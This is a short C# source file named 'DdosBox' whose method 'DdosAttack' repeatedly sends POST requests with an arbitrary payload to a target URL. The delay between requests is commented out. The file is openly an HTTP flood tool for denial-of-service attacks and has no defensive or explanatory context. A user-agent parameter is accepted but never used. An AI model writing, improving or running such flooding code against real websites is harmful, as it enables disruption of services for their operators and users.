using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;

namespace DdosBox
{
    public class HttpRequest
    {
        public string DdosAttack(string url, string content, string useragent,
            string contenttype, int repeats)
        {
            // DdosApplication by tankarmee
            for(int i = 0; i < repeats; i++)
            {/*
                Thread.Sleep(100);*/

                WebRequest request = WebRequest.Create(url);
                request.Method = "POST";

                byte[] data = Encoding.UTF8.GetBytes(content);
                request.ContentType = contenttype;
                request.ContentLength = data.Length;

                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls;
                using (Stream formatcStream = request.GetRequestStream())
                {
                    formatcStream.Write(data, 0, data.Length);
                }

                string result = "";

                WebResponse response = request.GetResponse();
                using (Stream stream = response.GetResponseStream())
                {
                    using (StreamReader reader = new StreamReader(stream))
                    {
                        result = reader.ReadToEnd();
                    }
                }

                response.Close();
            }
            return "";

        }
    }
}
